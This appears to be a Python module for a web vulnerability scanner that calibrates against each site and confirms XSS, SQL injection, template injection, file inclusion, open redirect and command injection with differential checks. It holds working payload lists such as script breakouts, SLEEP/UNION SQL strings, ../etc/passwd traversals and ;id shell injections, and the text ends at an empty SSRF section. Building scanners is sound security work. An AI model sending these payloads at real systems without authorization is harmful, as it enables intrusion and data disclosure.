"""High-precision adaptive vulnerability detection engine (Adaptive Detection Engine).

Goal: a *real, vulnerable* result rather than a false one, with high sensitivity
(never miss a vuln), using **per-site adaptive templates** instead of one fixed
template for everyone.

Principles applied:
  1. Per-target baseline calibration — judge by deviation from *this site's*
     behavior, not by absolute thresholds.
  2. Differential confirmation — payload <-> neutralized control <-> baseline;
     a vuln is confirmed only if the signal appears for the payload **and is
     absent** for the control/baseline (kills "the signal is always present").
  3. Context-aware XSS — unique marker + reflection-context detection
     (text/attr/script/comment) + measuring which special chars (< > " ')
     survived unescaped -> proves executability, not mere presence.
  4. Multi-oracle SQLi — differential boolean (1=1 vs 1=2) + error message +
     statistical timing.
  5. SSTI — unique numbers + proof the expression was evaluated (product
     appeared, expression gone) + additive control.
  6. Adaptive payloads — chosen by reflection context / engine type / blocking.
  7. Confidence tiers — confirmed (decisive evidence or two orthogonal signals)
     | probable | safe.
  8. A Proof object with every result (signals + baseline/payload/control
     diffs) — auditable.
  9. Sensitive but precise — anything below "confirmed" is surfaced as probable
     for review, not auto-reported.

Design: pure functions taking an injectable probe(value) function -> testable
with fakes, used both in the deep scan (subprocess) and at runtime via
asyncio.to_thread.
"""
from __future__ import annotations

import difflib
import re
import statistics
from dataclasses import dataclass, field

# ── Confidence tiers ─────────────────────────────────────────────────────────
CONFIRMED = "confirmed"   # decisive evidence or two orthogonal signals -> auto-reported
PROBABLE  = "probable"    # single signal -> human review, not auto-reported
SAFE      = "safe"
BLOCKED   = "blocked"     # WAF block — cannot prove a vuln through it


@dataclass
class Resp:
    """Unified response returned by probe() — decouples the engine from HTTP details."""
    status: int = 0
    headers: dict = field(default_factory=dict)
    body: str = ""
    elapsed: float = 0.0
    url: str = ""
    location: str = ""


@dataclass
class Baseline:
    canary: str = ""
    status: int = 0
    length: int = 0
    reflects: bool = False
    times: list = field(default_factory=list)
    body_sample: str = ""

    @property
    def time_med(self) -> float:
        return statistics.median(self.times) if self.times else 0.0

    @property
    def time_mad(self) -> float:
        if len(self.times) < 2:
            return 0.0
        m = self.time_med
        return statistics.median([abs(t - m) for t in self.times]) or 0.0


@dataclass
class Result:
    vuln: str
    confidence: str = SAFE
    signals: list = field(default_factory=list)
    evidence: str = ""
    payload: str = ""
    proof: dict = field(default_factory=dict)
    severity: str = ""        # critical | high | medium | low | info (set by passive/active detectors)
    url: str = ""             # the affected URL (used by passive findings)

    @property
    def vulnerable(self) -> bool:
        return self.confidence in (CONFIRMED, PROBABLE)


# ── Helper utilities ─────────────────────────────────────────────────────────
_counter = [0]


def _marker() -> str:
    _counter[0] += 1
    return f"zqx{_counter[0]:04d}cy"   # purely literal -> unaffected by HTML encoding


def _similar(a: str, b: str) -> float:
    """Fast text similarity (0..1) — length + content sample."""
    a = (a or "")[:6000]
    b = (b or "")[:6000]
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    lr = min(len(a), len(b)) / max(len(a), len(b))
    sm = difflib.SequenceMatcher(None, a, b).quick_ratio()
    return (lr + sm) / 2.0


# WAF block/challenge page markers (same logic as the server)
_WAF_MARKS = (
    "attention required! | cloudflare", "checking your browser before accessing",
    "just a moment...", "you have been blocked", "sorry, you have been blocked",
    "request unsuccessful. incapsula incident", "ddos protection by",
    "verify you are human", "enable javascript and cookies to continue",
    "this request has been blocked", "performance & security by cloudflare",
    "cf-error-details", "/cdn-cgi/challenge-platform",
)
_WAF_HDRS = ("cf-ray", "cf-mitigated", "x-sucuri-id", "x-datadome", "x-distil-cs", "x-iinfo")


def is_blocked(r: Resp) -> bool:
    """WAF block/challenge page? (conservative: block status + WAF header, or an explicit challenge phrase)."""
    if r is None:
        return False
    h = {str(k).lower(): str(v).lower() for k, v in (r.headers or {}).items()}
    server = h.get("server", "")
    if r.status in (401, 403, 429, 503) and (
            "cloudflare" in server or "akamai" in server or "sucuri" in server
            or any(k in h for k in _WAF_HDRS)):
        return True
    return any(m in (r.body or "")[:4000].lower() for m in _WAF_MARKS)


# ── Calibration: learn this specific site's behavior ─────────────────────────
def calibrate(probe, samples: int = 3) -> Baseline:
    """Send unique benign values to learn the site's normal status/length/time/reflection."""
    canary = _marker() + "benign"
    rs = []
    for _ in range(max(1, samples)):
        try:
            r = probe(canary)
        except Exception:
            r = None
        if r is not None:
            rs.append(r)
    if not rs:
        return Baseline(canary=canary)
    return Baseline(
        canary=canary,
        status=rs[-1].status,
        length=int(statistics.median([len(r.body or "") for r in rs])),
        reflects=any(canary in (r.body or "") for r in rs),
        times=[r.elapsed for r in rs if r.elapsed],
        body_sample=(rs[-1].body or "")[:6000],
    )


# ── Context-aware XSS ────────────────────────────────────────────────────────
def _context_at(body: str, idx: int) -> str:
    """Classify the reflection context at position idx: text | attr_dq | attr_sq | script | comment | tag."""
    pre = body[:idx]
    low = pre.lower()
    # Inside an HTML comment?
    if low.rfind("<!--") > low.rfind("-->"):
        return "comment"
    # Inside a <script ...> ... </script> tag?
    s_open = low.rfind("<script")
    s_close = low.rfind("</script")
    if s_open > s_close:
        # Is the opening tag closed? (inside the script body, not its attributes)
        gt = pre.rfind(">", s_open)
        if gt > s_open:
            return "script"
        return "tag"
    # Inside an open tag (attribute)? last '<' after last '>'
    lt = pre.rfind("<")
    gt = pre.rfind(">")
    if lt > gt:
        # Quote type surrounding the value inside the tag
        seg = pre[lt:]
        dq = seg.count('"') % 2 == 1
        sq = seg.count("'") % 2 == 1
        if dq:
            return "attr_dq"
        if sq:
            return "attr_sq"
        return "tag"
    return "text"


def _all_idx(s: str, sub: str):
    """Every start index of sub in s (non-overlapping is fine for our distinct markers)."""
    out, i = [], (s or "").find(sub)
    while i >= 0:
        out.append(i)
        i = s.find(sub, i + 1)
    return out


def _neutralised_as(after: str) -> str:
    """Name how an injected '<' was neutralised, given the bytes right after the marker — so a
    reflected-but-SAFE value is EXPLAINED (not silently dropped) and never confused with a raw bug.
    This is exactly the agoda/Burp case: < > " ' all turned into \\u003c / %3C inside a <script>."""
    a = (after or "")[:10].lower()
    if a.startswith("\\u00"):
        return "\\u00XX (JS unicode escape)"
    if a.startswith("\\x"):
        return "\\xXX (JS hex escape)"
    if a.startswith("&lt") or a.startswith("&#60") or a.startswith("&#x3c"):
        return "&lt; (HTML entity)"
    if a.startswith("%3c"):
        return "%3C (percent-encoded)"
    return ""


def analyze_reflection(probe):
    """Inject markers + special chars, then score EVERY reflection occurrence (Burp-style) by its
    OWN local breakout survival — context and survival always describe the SAME site, so a raw
    reflection is caught even when a safe (escaped) one appears earlier, and a quote that survives
    in unrelated markup can never be credited to a different reflection.

    Returns (context, resp, survived) where survived = {lt,gt,dq,sq,js_q,escaped_as} — the values
    are LOCAL to the chosen occurrence (not page-wide).
      escaped_as: when the value is NOT executable, HOW '<' was neutralised here (\\u003c / &lt; /
                  %3C / \\x3c) — explains the #1 Burp false positive (payload "echoed" but inert).
    context = 'none' when there is no reflection, 'blocked' on a WAF block.
    """
    mk = _marker()
    # Probe A: tag chars only, NO quotes. A single/double quote can break the underlying SQL query
    # on quote-sensitive routes and return a 500 — masking a genuine reflection. So measure '<'/'>'
    # survival with a quote-free value first.
    try:
        rA = probe(f"{mk}<{mk}>{mk}")
    except Exception:
        return "none", Resp(), {}
    if is_blocked(rA):
        return "blocked", rA, {}
    bA = rA.body or ""
    if mk not in bA:
        # That value may have errored on a quote/tag-sensitive route — confirm with a bare marker.
        try:
            rb = probe(mk)
        except Exception:
            rb = Resp()
        if mk not in (rb.body or ""):
            return "none", rA, {}
        bA, rA = (rb.body or ""), rb
    # Probe B: quotes in a SEPARATE request (a quote-triggered 500 must not mask the tag reflection).
    try:
        rB = probe(f'{mk}"{mk}\'{mk}')
        bB = rB.body or ""
    except Exception:
        bB = ""

    win = 3 * len(mk) + 4
    best = None        # (rank, ctx, survived_local, idx, body)

    def _empty():
        return {"lt": False, "gt": False, "dq": False, "sq": False, "js_q": "", "escaped_as": ""}

    def consider(rank, ctx, surv, idx, body):
        nonlocal best
        if best is None or rank > best[0]:
            best = (rank, ctx, surv, idx, body)

    # ── Probe A occurrences: local '<'/'>' survival → tag injection ──
    for j in _all_idx(bA, mk):
        after = bA[j + len(mk):]
        lt = after.startswith(f"<{mk}")
        gt = f"{mk}>{mk}" in bA[j:j + win]
        ctx = _context_at(bA, j)
        surv = _empty(); surv["lt"] = lt; surv["gt"] = gt
        if lt and gt and ctx in ("text", "script", "comment"):
            rank = 5                                   # raw <...> in a renderable sink = executable
        elif ctx in ("text", "script", "attr_dq", "attr_sq", "comment", "tag"):
            rank = 1                                   # reflected in a sink context but not breaking out
            if not lt:
                surv["escaped_as"] = _neutralised_as(after)
        else:
            rank = 0
        consider(rank, ctx, surv, j, bA)

    # ── Probe B occurrences: local quote survival → attribute / JS-string breakout ──
    for j in _all_idx(bB, mk):
        after = bB[j + len(mk):]
        dq = after.startswith(f'"{mk}')
        sq = after.startswith(f"'{mk}")
        ctx = _context_at(bB, j)
        surv = _empty(); surv["dq"] = dq; surv["sq"] = sq
        rank = 0
        if ctx == "attr_dq" and dq:
            rank = 5
        elif ctx == "attr_sq" and sq:
            rank = 5
        elif ctx == "script":
            jq = _js_string_quote(bB, j)
            surv["js_q"] = jq
            if (jq == '"' and dq) or (jq == "'" and sq) or jq == "`":
                rank = 5                               # breaks the JS string with its own delimiter
            elif jq == "" and (dq or sq):
                rank = 3                               # quote raw in bare script code
            else:
                rank = 1
        consider(rank, ctx, surv, j, bB)

    if best is None:
        anchor = bA.find(mk)
        return _context_at(bA, anchor), rA, _empty()
    rank, ctx, surv, idx, body = best
    if ctx == "script" and not surv.get("js_q"):
        surv["js_q"] = _js_string_quote(body, idx)     # for context-correct payload selection
    return ctx, rA, surv


def _js_string_quote(body: str, idx: int) -> str:
    """Return the quote char (\" ' or `) of the JS string literal enclosing idx, or '' if none.

    Walks the current <script> block from its opening '>' up to idx, tracking string state so we
    know whether the reflection sits inside a "…", '…' or `…` literal (and which delimiter to break).
    """
    low = body.lower()
    s_open = low.rfind("<script", 0, idx)
    gt = body.find(">", s_open) if s_open != -1 else -1
    i = gt + 1 if gt != -1 else 0
    n = idx
    q = ""
    while i < n:
        ch = body[i]
        if q:                                  # inside a string literal
            if ch == "\\":
                i += 2
            elif ch == q:
                q = ""
                i += 1
            else:
                i += 1
            continue
        if ch == "/" and i + 1 < n:            # skip JS comments so a quote in `// don't` can't fool us
            nx = body[i + 1]
            if nx == "/":
                j = body.find("\n", i + 2)
                i = j if j != -1 else n
                continue
            if nx == "*":
                j = body.find("*/", i + 2)
                i = j + 2 if j != -1 else n
                continue
        if ch in ('"', "'", "`"):
            q = ch
        i += 1
    return q


def _xss_payload_for(ctx: str, mk: str, surv: dict | None = None) -> str:
    """A payload template *that varies by context* to prove execution."""
    surv = surv or {}
    if ctx == "script":
        # If '<'/'>' survive, the reliable break-out of an inline <script> block is to close the
        # tag (works regardless of JS string quoting). Otherwise break the JS string with the SAME
        # quote that delimits it ("…" → ", '…' → ', `…` → template-literal interpolation).
        if surv.get("lt") and surv.get("gt"):
            return f"{mk}</script><svg/onload=alert({mk})>"
        jq = surv.get("js_q") or "'"
        if jq == "`":
            return f"{mk}${{alert({mk})}}"          # break out of a template literal
        return f"{mk}{jq};alert({mk});//"           # break out of a '…' or \"…\" JS string
    if ctx == "attr_dq":
        return f'{mk}"><svg/onload=alert({mk})>'  # break out of a double-quoted attribute
    if ctx == "attr_sq":
        return f"{mk}'><svg/onload=alert({mk})>"  # break out of a single-quoted attribute
    if ctx == "comment":
        return f"{mk}--><svg/onload=alert({mk})>" # break out of a comment
    return f"{mk}<svg/onload=alert({mk})>"        # ordinary HTML text


def detect_xss(probe, baseline: Baseline | None = None) -> Result:
    ctx, r, surv = analyze_reflection(probe)
    if ctx == "blocked":
        return Result("xss", BLOCKED, ["WAF/challenge response"])
    if ctx == "none":
        return Result("xss", SAFE, ["no reflection"])

    # Content-Type guard: a marker reflected inside a NON-HTML response (a JSON API error,
    # plain text, JavaScript, CSS) is NOT executed as markup by the browser → not XSS. Only
    # text/html | xhtml | xml (or an absent content-type) renders our tags.
    _ct = ""
    try:
        _h = r.headers or {}
        _ct = str(_h.get("Content-Type") or _h.get("content-type") or "").lower()
    except Exception:
        _ct = ""
    if _ct and not any(_k in _ct for _k in ("html", "xhtml", "xml")):
        return Result("xss", SAFE,
                      [f"reflected but response is {_ct.split(';')[0].strip()} — not rendered as HTML"],
                      proof={"context": ctx, "content_type": _ct.split(';')[0].strip()})

    proof = {"context": ctx, "survived": surv}
    executable = False
    signals = []
    if ctx in ("text", "script") and surv["lt"] and surv["gt"]:
        executable = True
        signals.append(f"tag-injection possible in {ctx} (< and > unescaped)")
    if ctx == "attr_dq" and surv["dq"]:
        executable = True
        signals.append('attribute breakout possible (" unescaped)')
    if ctx == "attr_sq" and surv["sq"]:
        executable = True
        signals.append("attribute breakout possible (' unescaped)")
    if ctx == "script" and not (surv["lt"] and surv["gt"]):
        # Breakout requires the SAME quote that delimits the string to survive unescaped — a single
        # quote does NOT break a double-quoted string (the Burp screenshot case), so don't claim it.
        jq = surv.get("js_q") or ""
        if jq == '"' and surv["dq"]:
            executable = True
            signals.append('JS string breakout possible (double-quoted "…", " unescaped)')
        elif jq == "'" and surv["sq"]:
            executable = True
            signals.append("JS string breakout possible (single-quoted '…', ' unescaped)")
        elif jq == "`":
            executable = True
            signals.append("JS template-literal injection possible (`…`)")
        elif jq == "" and (surv["dq"] or surv["sq"]):
            executable = True
            signals.append("JS breakout possible (quote unescaped in script)")

    if not executable:
        # Reflected but encoded / non-executable -> safe (prevents 'a mere <script> = vuln').
        # When we know HOW it was neutralised, SAY so — this is the agoda/Burp false-positive:
        # the bytes are "echoed" but </%3C/&lt; make them inert in that context.
        why = "reflected but encoded / non-executable"
        ea = surv.get("escaped_as")
        if ea:
            why = (f"reflected in {ctx} context but neutralised as {ea} — NOT executable "
                   f"(a raw-bytes scanner may false-positive here)")
        return Result("xss", SAFE, [why], proof=proof)

    # Differential confirmation: a real payload reflects verbatim, an encoded control does not
    mk = _marker()
    payload = _xss_payload_for(ctx, mk, surv)
    try:
        rp = probe(payload)
    except Exception:
        rp = Resp()
    if is_blocked(rp):
        # Blocked on the actual payload -> try a simpler form before judging (WAF adaptation)
        alt = f"{mk}<img src=x onerror=alert({mk})>"
        try:
            rp = probe(alt)
        except Exception:
            rp = Resp()
        if is_blocked(rp):
            return Result("xss", PROBABLE,
                          signals + ["special chars unescaped but active payload blocked by WAF"],
                          proof=proof)
        payload = alt

    payload_raw = payload in (rp.body or "")            # the raw payload appeared as-is
    control = _html_encode(payload)
    try:
        rc = probe(control)
    except Exception:
        rc = Resp()
    control_raw = payload in (rc.body or "")            # an encoded version must NOT produce the raw form

    if payload_raw:
        signals.append("active payload reflected verbatim & unescaped")
    if not control_raw:
        signals.append("encoded control NOT reflected raw (differential)")

    ev = _excerpt(rp.body, payload)
    if payload_raw and not control_raw:
        return Result("xss", CONFIRMED, signals, evidence=ev, payload=payload, proof=proof)
    if payload_raw:
        return Result("xss", PROBABLE, signals, evidence=ev, payload=payload, proof=proof)
    return Result("xss", PROBABLE, signals + ["context breakout chars unescaped"],
                  payload=payload, proof=proof)


def _html_encode(s: str) -> str:
    return (s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
             .replace('"', "&quot;").replace("'", "&#39;"))


def _excerpt(body: str, needle: str, span: int = 120) -> str:
    body = body or ""
    i = body.find(needle)
    if i < 0:
        return body[:200]
    a = max(0, i - span)
    return body[a:i + len(needle) + span]


# ── SQLi: multi-oracle (boolean + error + timing + UNION) ────────────────────
_SQL_ERRS = (
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "ora-0", "sqlite_error", "pg_query()",
    "postgresql error", "syntax error at or near", "microsoft jet database",
    "odbc microsoft access", "sqlstate", "mysql_fetch", "supplied argument is not a valid mysql",
    # expanded DBMS error fingerprints (closer to Burp/sqlmap coverage)
    "sqlexception", "psqlexception", "ora-00933", "ora-01756", "ora-00921", "ora-00936",
    "incorrect syntax near", "conversion failed when converting", "data type mismatch",
    "mysql server version for the right syntax", "valid mysql result", "com.mysql.jdbc",
    "org.postgresql.util.psqlexception", "sqlite3.operationalerror", "near \"'\": syntax error",
    "unterminated quoted string", "column count doesn't match", "db2 sql error", "sybase message",
    "[microsoft][odbc sql server driver]", "warning: pg_", "mysqli_", "pdoexception",
)
# Adaptive (TRUE, FALSE) pairs for different quoting styles
_SQL_BOOL_PAIRS = [
    (" AND 1=1", " AND 1=2"),
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    (" OR 1=1-- -", " AND 1=2-- -"),
]
_SQL_TIME = ["%s' AND SLEEP(5)-- -", "%s'; WAITFOR DELAY '0:0:5'-- -",
             "%s' AND pg_sleep(5)-- -", "%s AND SLEEP(5)",
             "%s')) AND SLEEP(5)-- -", "%s\" AND SLEEP(5)-- -"]
# UNION-based: inject a marker via UNION SELECT; if it reflects, columns line up = injectable
_SQL_UNION = ["%s' UNION SELECT %s-- -", "%s' UNION SELECT %s,%s-- -",
              "%s' UNION SELECT %s,%s,%s-- -", "%s UNION SELECT %s-- -",
              "%s')) UNION SELECT %s,%s-- -"]


def _bool_branch(self_body, r_self, rt, rf):
    """Classify (rt, rf) against the benign self response → an oracle info dict, or None.

    Two accepted, FP-guarded shapes:
      content  : TRUE mirrors benign (sim>=.99, same status) and FALSE is RELATED-but-different
                 (0.30..0.85) — a real 'no rows', NOT a ~0.00 alien page from view/route selection.
                 Also requires FALSE body ≥ 50% of benign length to reject validation-error pages
                 (short error bodies like "400 Bad Request" with no template).
      false-5xx: TRUE mirrors benign and FALSE breaks the query into a 5xx server error. Requires a
                 NON-TRIVIAL benign body (>=24 chars) so a tiny telemetry sink ("ok") plus a one-off
                 edge/CDN 5xx cannot masquerade as a broken SQL/NoSQL query.

    Both branches require the TRUE response to match the benign nearly perfectly (sim≥0.99 instead
    of ≥0.95) so that routing/configuration parameters whose injected value still renders the same
    page (lenient validation) cannot masquerade as a SQL/NoSQL boolean oracle.
    """
    if is_blocked(rt) or is_blocked(rf):
        return None
    sim_t = _similar(self_body, rt.body)
    sim_f = _similar(self_body, rf.body)
    flen = len(rf.body or "")
    blen = len(self_body)
    if (r_self.status == rt.status == rf.status and sim_t >= 0.99
            and 0.30 <= sim_f <= 0.85 and (sim_t - sim_f) >= 0.1
            and flen >= blen * 0.50):
        return {"true_sim": round(sim_t, 3), "false_sim": round(sim_f, 3),
                "status": r_self.status, "branch": "content"}
    if (rt.status == r_self.status and r_self.status < 500
            and sim_t >= 0.99 and rf.status >= 500 and len(self_body) >= 24):
        return {"true_sim": round(sim_t, 3), "false_sim": round(sim_f, 3),
                "status": f"{r_self.status}->{rf.status}", "branch": "false-5xx"}
    return None


def _bool_diff(probe, orig, pairs):
    """Self-anchored, FP-guarded, RE-CONFIRMED boolean differential shared by SQLi and NoSQLi.

    Anchors on THIS point's own benign response (probe(orig)) rather than a site baseline, rejects
    content/route-selector params and status flips (see _bool_branch), and — crucially — re-runs
    any candidate oracle a SECOND time: a real injection is deterministic, whereas a one-off
    CDN/rate-limit 5xx or random content jitter (the #1 false positive on telemetry/edge endpoints,
    e.g. the bento.agoda.com X-Forwarded-For case) will not reproduce the same branch.
    Returns (hit, info_dict) where info has true_sim/false_sim/status/pair.
    """
    try:
        r_self = probe(orig or "")
    except Exception:
        r_self = Resp()
    self_body = r_self.body or ""
    if not self_body or is_blocked(r_self):
        return False, {}
    for t_suf, f_suf in pairs:
        try:
            rt = probe((orig or "") + t_suf)
            rf = probe((orig or "") + f_suf)
        except Exception:
            continue
        info = _bool_branch(self_body, r_self, rt, rf)
        if not info:
            continue
        # Re-confirm with fresh TRUE/FALSE probes (the benign self page is assumed stable). A
        # transient 5xx / content blip fails to reproduce the SAME branch → reject as noise.
        try:
            rt2 = probe((orig or "") + t_suf)
            rf2 = probe((orig or "") + f_suf)
        except Exception:
            continue
        info2 = _bool_branch(self_body, r_self, rt2, rf2)
        if not info2 or info2["branch"] != info["branch"]:
            continue
        info.pop("branch", None)
        info["pair"] = t_suf.strip()
        return True, info
    return False, {}


def detect_sqli(probe, baseline: Baseline, orig: str = "1", timing: bool = True) -> Result:
    signals = []
    proof = {}
    # 1) Explicit DB error message
    try:
        rq = probe((orig or "") + "'")
    except Exception:
        rq = Resp()
    if is_blocked(rq):
        return Result("sqli", BLOCKED, ["WAF/challenge response"])
    err = next((e for e in _SQL_ERRS if e in (rq.body or "").lower()), None)
    if err and rq.status >= 400:
        signals.append("db-error: " + err)
        proof["error"] = err
    elif err:
        # SQL error keyword in a 2xx/3xx response — likely from a generic error handler, not real SQL
        pass

    # 2) Differential boolean (self-anchored + FP-guarded — see _bool_diff)
    bool_hit, binfo = _bool_diff(probe, orig, _SQL_BOOL_PAIRS)
    if bool_hit:
        signals.append(f"boolean-based: TRUE~self({binfo['true_sim']:.2f}) vs "
                       f"FALSE differs({binfo['false_sim']:.2f}) [status {binfo['status']}, related-not-alien]")
        proof["boolean"] = binfo

    # 2b) UNION-based: a unique marker surfaced via UNION SELECT proves column alignment.
    # FP guard: a reflected marker only means SQL if the app does NOT simply echo the input.
    # First send a plain control (the marker as an ordinary value, no SQL syntax). If THAT
    # reflects, the parameter echoes input → a UNION marker reflecting proves nothing → skip.
    # Also require the UNION response to be a normal page (status < 400, non-empty, not blocked),
    # so a WAF rejection / 406 / empty body can never be misread as a confirmed injection.
    union_hit = False
    if not bool_hit:
        umk = _marker()
        try:
            rc = probe((orig or "") + umk)          # plain control: marker as a value, no SQL
            reflective = (not is_blocked(rc)) and (umk in (rc.body or ""))
        except Exception:
            reflective = False
        if not reflective:
            for tmpl in _SQL_UNION:
                n = tmpl.count("%s") - 1
                try:
                    pl = tmpl % ((orig or "",) + (umk,) * n)
                    ru = probe(pl)
                except Exception:
                    continue
                if is_blocked(ru) or ru.status >= 400 or not (ru.body or "").strip():
                    continue
                if umk in (ru.body or ""):
                    union_hit = True
                    signals.append(f"UNION-based: marker surfaced via UNION SELECT ({n} column(s)); "
                                   f"plain-value control did NOT reflect [status {ru.status}]")
                    proof["union"] = {"columns": n, "marker": umk, "status": ru.status}
                    break

    # 3) Statistical timing (two-pass re-confirmation) vs baseline — skipped in fast (runtime) mode
    time_hit = False
    if timing and baseline and baseline.times:
        thr = max(5.0, baseline.time_med + 4.0 * max(1.0, (baseline.time_mad or 0.5) / max(0.1, baseline.time_med)))
        for tmpl in _SQL_TIME:
            pl = tmpl % (orig or "")
            samples = []
            for _ in range(2):
                try:
                    rr = probe(pl)
                except Exception:
                    rr = Resp()
                if is_blocked(rr):
                    samples = []
                    break
                samples.append(rr.elapsed)
            if len(samples) == 2 and min(samples) >= thr:
                # Re-confirm: send 2 more samples to rule out network jitter
                samples2 = []
                for _ in range(2):
                    try:
                        rr = probe(pl)
                    except Exception:
                        rr = Resp()
                    if is_blocked(rr):
                        samples2 = []
                        break
                    samples2.append(rr.elapsed)
                if len(samples2) == 2 and min(samples2) >= thr:
                    # Accept only if both passes are consistent (within 30% of each other)
                    if abs(min(samples) - min(samples2)) / max(min(samples), min(samples2)) <= 0.30:
                        time_hit = True
                        signals.append(f"time-based: {min(samples):.1f}s & {min(samples2):.1f}s vs base {baseline.time_med:.1f}s")
                        proof["timing"] = {"samples": [round(s, 2) for s in samples], "reconfirm": [round(s, 2) for s in samples2], "threshold": round(thr, 2)}
                        break

    # Confidence tiers: UNION proof is decisive. Boolean + at least one orthogonal signal (error
    # OR timing) -> CONFIRMED. Boolean-only, error-only, or timing-alone -> PROBABLE (any single
    # signal can be a false positive — routing/param validation mimics boolean oracles at ~0.99-0.85
    # similarity because error/validation pages share the same HTML template with the normal page).
    if union_hit:
        return Result("sqli", CONFIRMED, signals, evidence=(rq.body or "")[:400],
                      payload=(orig or "") + "'", proof=proof, severity="critical")
    if bool_hit and (err or time_hit):
        return Result("sqli", CONFIRMED, signals, evidence=(rq.body or "")[:400],
                      payload=(orig or "") + "'", proof=proof, severity="critical")
    if bool_hit or err or time_hit:
        return Result("sqli", PROBABLE, signals, evidence=(rq.body or "")[:400],
                      payload=(orig or "") + "'", proof=proof, severity="high")
    # Fallback: per-DBMS time-based blind + UNION (catches DBMS-specific syntax the generic
    # boolean/error/union templates miss, e.g. Oracle's FROM dual or pg_sleep quoting).
    dbms_res = detect_sqli_dbms(probe, baseline, orig)
    if dbms_res.confidence != SAFE:
        return dbms_res
    return Result("sqli", SAFE, ["no sql signal"], proof=proof)


# ── SSTI: confirmed arithmetic evaluation + additive control ─────────────────
_SSTI_ENGINES = [
    ("jinja/twig", "{{%d*%d}}"),
    ("jinja-add", "{{%d+%d}}"),
    ("freemarker", "${%d*%d}"),
    ("erb", "<%%= %d*%d %%>"),
    ("velocity", "#set($x=%d*%d)$x"),
    ("smarty", "{%d*%d}"),
]


def detect_ssti(probe, baseline: Baseline | None = None) -> Result:
    a, b = 1973, 2087            # two primes -> product 4117651 is very rare in pages
    prod = str(a * b)
    summ = str(a + b)
    for engine, tmpl in _SSTI_ENGINES:
        op = "*" if "%d*%d" in tmpl else "+"
        pl = tmpl % (a, b)
        try:
            r = probe(pl)
        except Exception:
            continue
        if is_blocked(r):
            return Result("ssti", BLOCKED, ["WAF/challenge response"])
        body = r.body or ""
        if op == "*" and prod in body and pl not in body:
            # additive control: replacing * with + must NOT yield the product
            ctrl = pl.replace("*", "+")
            try:
                rc = probe(ctrl)
            except Exception:
                rc = Resp()
            ctrl_no_prod = prod not in (rc.body or "")
            sig = [f"template evaluated ({a}*{b}={prod}) engine~{engine}"]
            if ctrl_no_prod:
                sig.append("additive control did not yield product (differential)")
                return Result("ssti", CONFIRMED, sig, evidence=_excerpt(body, prod),
                              payload=pl, proof={"engine": engine, "product": prod})
            return Result("ssti", PROBABLE, sig, evidence=_excerpt(body, prod), payload=pl)
    return Result("ssti", SAFE, ["no template evaluation"])


# ── LFI: system file content + correlation against the baseline ──────────────
_LFI_PAYLOADS = [
    "../../../../etc/passwd", "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd", "../../../../windows/win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]
_LFI_MARKS = ("root:x:0:0", "daemon:x:", "[extensions]", "[fonts]",
              "for 16-bit app support", "[boot loader]", "PD9waHA")


def detect_lfi(probe, baseline: Baseline | None = None) -> Result:
    base = baseline.body_sample if baseline else ""
    for pl in _LFI_PAYLOADS:
        try:
            r = probe(pl)
        except Exception:
            continue
        if is_blocked(r):
            return Result("lfi", BLOCKED, ["WAF/challenge response"])
        body = r.body or ""
        mk = next((m for m in _LFI_MARKS if (m in body if m == "PD9waHA" else m in body.lower())), None)
        # correlation: marker present in the payload response and absent from the baseline -> real leak
        if mk and mk not in base:
            return Result("lfi", CONFIRMED, [f"system file content disclosed ({mk})"],
                          evidence=_excerpt(body, mk if mk != "PD9waHA" else "PD9waHA"),
                          payload=pl, proof={"marker": mk})
    return Result("lfi", SAFE, ["no file disclosure"])


# ── Open Redirect: follow the destination and confirm it is an external domain ──
_OR_HOST = "oob-redirect-probe.example"
_OR_PAYLOADS = ["https://%s" % _OR_HOST, "//%s" % _OR_HOST, "https:%s" % _OR_HOST,
                "/\\%s" % _OR_HOST, "https://%s/%%2f.." % _OR_HOST]


def detect_open_redirect(probe, target_netloc: str = "") -> Result:
    tn = (target_netloc or "").lower()
    for pl in _OR_PAYLOADS:
        try:
            r = probe(pl)   # probe must disable following and populate r.location
        except Exception:
            continue
        if is_blocked(r):
            return Result("open_redirect", BLOCKED, ["WAF/challenge response"])
        loc = r.location or r.headers.get("Location", "") or r.headers.get("location", "")
        if not loc:
            continue
        net = _netloc(loc)
        if net and net == _OR_HOST:
            return Result("open_redirect", CONFIRMED,
                          [f"Location → external {net}"], evidence="Location: " + loc[:200],
                          payload=pl, proof={"location": loc})
    return Result("open_redirect", SAFE, ["no external redirect"])


def _netloc(u: str) -> str:
    u = (u or "").replace("\\", "/")
    m = re.match(r"\s*[a-zA-Z][a-zA-Z0-9+.\-]*:?//([^/?#]+)", u) or re.match(r"\s*//([^/?#]+)", u)
    host = m.group(1) if m else ""
    return host.lower().split("@")[-1].split(":")[0]


# ── CMDi: command output or confirmed timing ─────────────────────────────────
_CMDI_OUT = re.compile(r"uid=\d+\(.+?\)\s+gid=\d+")
_CMDI_PAYLOADS = [";id", "|id", "&&id", "`id`", "$(id)", "%0aid"]
_CMDI_TIME = [";sleep 5", "|sleep 5", "$(sleep 5)", "& ping -n 5 127.0.0.1 &"]


def detect_cmdi(probe, baseline: Baseline | None = None, timing: bool = True) -> Result:
    for pl in _CMDI_PAYLOADS:
        try:
            r = probe(pl)
        except Exception:
            continue
        if is_blocked(r):
            return Result("cmdi", BLOCKED, ["WAF/challenge response"])
        m = _CMDI_OUT.search(r.body or "")
        if m:
            return Result("cmdi", CONFIRMED, ["command output (uid=/gid=) returned"],
                          evidence=_excerpt(r.body, m.group(0)), payload=pl, proof={"match": m.group(0)})
    if timing and baseline and baseline.times:
        thr = max(4.0, baseline.time_med + 4.0)
        for pl in _CMDI_TIME:
            samples = []
            for _ in range(2):
                try:
                    rr = probe(pl)
                except Exception:
                    rr = Resp()
                if is_blocked(rr):
                    samples = []
                    break
                samples.append(rr.elapsed)
            if len(samples) == 2 and min(samples) >= thr:
                return Result("cmdi", CONFIRMED,
                              [f"time-based command delay {samples[0]:.1f}s & {samples[1]:.1f}s"],
                              payload=pl, proof={"samples": samples})
    return Result("cmdi", SAFE, ["no command execution"])


# ── SSRF: internal/metadata content + OOB hook (optional) ────────────────────
